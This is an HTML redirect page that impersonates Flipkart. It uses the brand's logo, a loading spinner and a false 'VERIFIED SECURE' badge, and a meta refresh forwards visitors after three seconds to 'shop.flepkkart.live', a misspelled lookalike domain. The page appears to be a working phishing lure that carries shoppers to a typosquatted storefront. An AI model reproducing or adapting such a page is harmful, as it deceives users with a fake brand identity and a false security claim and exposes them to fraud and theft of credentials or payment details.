<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="refresh" content="3;url=https://shop.flepkkart.live/shop">
  <title>Flipkart - Redirecting</title>

  <style>
    body {
      margin: 0;
      height: 100vh;
      background: radial-gradient(circle at bottom, #0b3aa8, #06152b);
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: Arial, sans-serif;
      color: #fff;
    }

    .card {
      width: 90%;
      max-width: 360px;
      background: rgba(255,255,255,0.05);
      backdrop-filter: blur(6px);
      border-radius: 16px;
      padding: 40px 20px;
      text-align: center;
      box-shadow: 0 20px 50px rgba(0,0,0,0.6);
    }

    .logo-wrap {
      width: 140px;
      height: 140px;
      background: #fff;
      border-radius: 50%;
      margin: 0 auto 25px;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .logo-wrap img {
      width: 95px;
    }

    h1 {
      font-size: 22px;
      margin: 10px 0;
      letter-spacing: 1px;
    }

    p {
      font-size: 14px;
      opacity: 0.85;
      margin-bottom: 25px;
    }

    .spinner {
      width: 45px;
      height: 45px;
      border: 4px solid rgba(255,255,255,0.3);
      border-top: 4px solid #1da1f2;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 0 auto 20px;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    .secure {
      font-size: 13px;
      color: #9bc9ff;
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 6px;
    }
  </style>
</head>

<body>
  <div class="card">
    <div class="logo-wrap">
      <img src="https://static-assets-web.flixcart.com/batman-returns/batman-returns/p/images/flipkart-logo-f.png" alt="Flipkart">
    </div>

    <h1>PLEASE WAIT</h1>
    <p>Redirecting to your destination...</p>

    <div class="spinner"></div>

    <div class="secure">âœ” VERIFIED SECURE</div>
  </div>
</body>
</html>
